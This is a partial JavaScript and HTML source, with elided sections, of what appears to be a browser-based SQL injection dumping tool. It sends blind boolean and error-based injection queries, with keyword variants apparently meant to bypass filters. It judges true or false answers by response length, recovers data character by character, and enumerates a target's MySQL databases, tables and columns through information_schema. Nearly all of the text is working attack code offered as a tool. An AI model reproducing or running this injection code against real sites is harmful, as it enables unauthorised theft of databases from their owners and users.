...
<div id='main'>\
	...
	<div id='submain'>\
		...
		<div id='datadumper' alt='Dumper'>coding...</div>\
	</div>\
</div>\
<div id='datastore' class='hidden'></div>\
...
function BlindGetChar(inject,count,callback){
	...
	SQLIAjax(URL[0]+query+">"+(BLD['bot']+BLD['jump'])+"--"+SQL['space']+"-"+URL[1],
		function(xhr){
			if(Math.abs(xhr.responseText.length - BLD['true']) < VTM['offset']){ //true
				BLD['bot'] += BLD['jump'];
			}else{
			...
			if(BLD['jump'] == 0){
				if(BLD['top'] <= 0)
				{
					...
					BLD['bot'] = 90;
					BLD['jump'] = 30;
					BlindSubChar(inject,count+1,callback);
				}
			}else{
...
function BlindSubChar(inject,count,callback,key){
	var query = SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+SQL[VTM['bypass']]['ascii']+"("+SQL[VTM['bypass']]['substring']+"(("+inject+"),"+count+",1))";
	SQLIAjax(URL[0]+query+">"+BLD['bot']+"--"+SQL['space']+"-"+URL[1],
		function(xhr){
			if(Math.abs(xhr.responseText.length - BLD['true']) < VTM['offset']){ //true
				BLD['bot'] += BLD['jump'];
				...
				if(key){
					...
					BlindGetChar(inject,count,callback,0);
				}else{
					if(BLD['top'] <= 0){
						var data = {responseText : SQL['start']+SQL['Data']+SQL['stop']};
						callback(data);
...
function BlindGetData(inject,callback)
{
	SQL['Data'] = "";
	BLD['top'] =0;
	BLD['bot'] = 90;
	BLD['jump'] = 30;
	var q1 = URL[0]+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+"1=1--"+SQL['space']+"-"+URL[1];
	var q2 = URL[0]+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+"1=0--"+SQL['space']+"-"+URL[1];
	SQLIAjax(q1,
		function(xhr){
			SQLIAjax(q2,
				function(xhr1){
					if(Math.abs(xhr.responseText.length - xhr1.responseText.length) > VTM['offset']){
						BLD['true'] = xhr.responseText.length;
						BlindSubChar(SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+inject+")"+SQL[VTM['bypass']]['as']+SQL['space']+"T",1,callback,0);
					}else{
						alert("Cann't Blind!");
						return;
					}
...
function ErrorGetData(inject,count,callback)
{
	if(SQL['Data'].split(SQL['stop']).length < 2)
	{
		...
		SQLIAjax(query,
			function(xhr){
				SQL['Data'] += xhr.responseText.split(SQL['ErrorChar'])[1];
				if(SQL['Data'] != ""){
...
function MySQLGetDBs(count)
{
	...
	if(VTM['method'] == 'union'){
		...
		BlindGetData(injectdbs,AddDB);
	}
}
function DBsGetListData(){
	var dbs = $("#datastore");
	if($.trim(dbs.html()) == ""){
		return 0;
	}else{
...
function DBsSetListData(db){
	$("#datastore").append("<div class='db' value='"+db+"'></div>");
}
/*******************************************
table function
*******************************************/
function TBsGetListData(){
	var tbs = $("#datastore").children(".db[value='"+DATA['database']+"']");
	if($.trim(tbs.html()) == ""){
		return 0;
	}else{
		return tbs;
...
function TBsSetListData(tb){
	$("#datastore").children(".db[value='"+DATA['database']+"']").append("<div class='tb' value='"+tb+"'></div>");
}
...
{
	if(VTM['type'] == 'mysql'){
		var injecttbs = SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['table_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['tables']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit'];
	}else{
	...
	if(VTM['method'] == 'union'){
		...
		BlindGetData(injecttbs,AddTB);
	}
}
/*******************************************
column function
*******************************************/
function CLsGetListData(){
	var cls = $("#datastore").children(".db[value='"+DATA['database']+"']").children(".tb[value='"+DATA['table']+"']");
	if($.trim(cls.html()) == ""){
		return 0;
	}else{
		return cls;
...
function CLsSetListData(cl){
	$("#datastore").children(".db[value='"+DATA['database']+"']").children(".tb[value='"+DATA['table']+"']").append("<div class='cl' value='"+cl[0]+"' type='"+cl[1]+"'></div>");
}
...
{
	if(VTM['type'] == 'mysql'){
		var injectcls = SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+SQL[VTM['bypass']]['column_name']+",0x2e,hEx(COLUMN_TYPE))"+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['columns']+SQL['space']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_name']+"="+t2h(DATA['table'])+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit'];
	}else{
...
$("#selectdbs").live("click",function(){
	...
	$("#menu .database").click();
	//ActiveDBs(0);
	var dbs = DBsGetListData();
	if(dbs){
		dbs.children(".db").each(function(){
			AppendDB($(this).attr('value'));
		});
	}else{
		MySQLGetDBs(0);
	}
...
$(".dbname").live("click",function(){
	...
	var tbs = TBsGetListData();
	if(tbs){
		tbs.children(".tb").each(function(){
			AppendTB($(this).attr('value'));
		});
	}else{
		MySQLGetTBs(0);
	}
...
$(".tbname").live("click",function(){
	...
	var cls = CLsGetListData();
	if(cls){
		cls.children(".cl").each(function(){
			AppendCL([$(this).attr('value'),$(this).attr('type')]);
		});
	}else{
		MySQLGetCLs(0);
	}
